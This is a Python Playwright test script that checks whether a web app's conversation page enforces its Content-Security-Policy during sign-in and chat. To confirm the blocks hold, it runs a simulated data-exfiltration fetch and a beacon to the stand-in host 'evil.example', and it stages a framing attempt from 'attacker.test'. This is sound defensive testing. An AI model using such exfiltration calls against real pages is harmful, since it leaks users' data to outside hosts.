"""Playwright driver: the approved /conversation page under its REAL Content-Security-Policy (no bypass; only non-eval Playwright APIs are used).

``python browser_p1_csp.py <base_url> <out_dir> <email>`` -- prints one JSON object per line: {"step","ok","detail"}.
"""
import json
import sys
import time

from playwright.sync_api import sync_playwright

BASE, OUT, EMAIL = sys.argv[1:4]
PW = "Journey-Pass-91x"
viol = []


def report(step, ok, detail=""):
    print(json.dumps({"step": step, "ok": bool(ok), "detail": str(detail)[:900]}), flush=True)


def poll(fn, timeout=30.0, every=0.2):
    end = time.time() + timeout
    while time.time() < end:
        if fn():
            return True
        time.sleep(every)
    return fn()


with sync_playwright() as pw:
    browser = pw.chromium.launch()
    ctx = browser.new_context(viewport={"width": 1280, "height": 800})          # CSP ENFORCED
    page = ctx.new_page()
    page.on("console", lambda m: viol.append(m.text) if "Content Security Policy" in m.text else None)
    try:
        resp = page.goto(f"{BASE}/conversation")
        header = resp.headers.get("content-security-policy", "")
        report("C1_policy_is_delivered_with_the_page", "frame-ancestors 'none'" in header and "connect-src 'self'" in header, header[:300])
        page.wait_for_selector("#auth-overlay", state="visible", timeout=15000)
        # the contextual auth steps render under the policy
        page.click("#si-forgot-btn")
        page.wait_for_selector("#fp-email", state="visible", timeout=5000)
        page.click("text=Back to sign in")
        page.fill("#si-email", EMAIL)
        page.fill("#si-password", PW)
        page.click("#si-btn")
        page.wait_for_selector("#auth-overlay", state="hidden", timeout=15000)
        time.sleep(0.6)
        if "Choose model" in page.inner_text("#model-label"):
            page.click("#model-btn")
            page.wait_for_selector("#model-panel.open", timeout=10000)
            page.locator("#model-panel .modelopt:not(.unavailable)").first.click()
        page.fill("#msg-input", "hello under policy")
        page.click("#send-btn")
        ok = poll(lambda: page.locator(".answer .msg-body").count() > 0 and len(page.locator(".answer .msg-body").last.inner_text()) > 3)
        report("C2_sign_in_and_streamed_answer_work_under_the_policy", ok, "")
        page.locator("#theme-btn, [aria-label*='theme' i]").first.click(timeout=2000) if page.locator("#theme-btn, [aria-label*='theme' i]").count() else None
        # the page cannot send data to another origin (exfiltration limit)
        outcome = page.evaluate("""async () => { try { await fetch('https://evil.example/collect?d=secret', {mode: 'no-cors'}); return 'sent'; } catch (e) { return 'blocked:' + e.name; } }""")
        report("C3_a_script_cannot_reach_another_origin", str(outcome).startswith("blocked"), outcome)
        beacon = page.evaluate("() => navigator.sendBeacon('https://evil.example/b', 'x')")
        time.sleep(1.0)
        # sendBeacon returns true when it merely queues; the proof that it was refused is the policy violation Chromium reports for that exact URL
        report("C4_beacon_to_another_origin_is_refused", any("evil.example/b" in v for v in viol), f"queued={beacon}; violations={len(viol)}")
        # another origin cannot frame the signed-in application
        other = ctx.new_page()
        other.route("http://attacker.test/**", lambda r: r.fulfill(status=200, content_type="text/html", body=f'<iframe id="f" src="{BASE}/conversation" width="800" height="600"></iframe>'))
        other.goto("http://attacker.test/")
        time.sleep(2.0)
        frames = [f for f in other.frames if f != other.main_frame]
        loaded = [f.url for f in frames if f.url.startswith(BASE) and "chrome-error" not in f.url]
        inner = ""
        for f in frames:
            try:
                inner = f.locator("#reading-container").count()
            except Exception:
                inner = 0
        report("C5_the_application_cannot_be_framed_by_another_site", not inner, json.dumps({"frames": [f.url for f in frames]}))
        report("C6_no_policy_violations_by_the_page_itself", not [v for v in viol if "evil.example" not in v], "; ".join(v[:160] for v in viol)[:600])
    except Exception as exc:
        report("C0_driver", False, f"{type(exc).__name__}: {str(exc)[:600]}")
        try:
            page.screenshot(path=f"{OUT}/csp_FAIL.png")
        except Exception:
            pass
    browser.close()
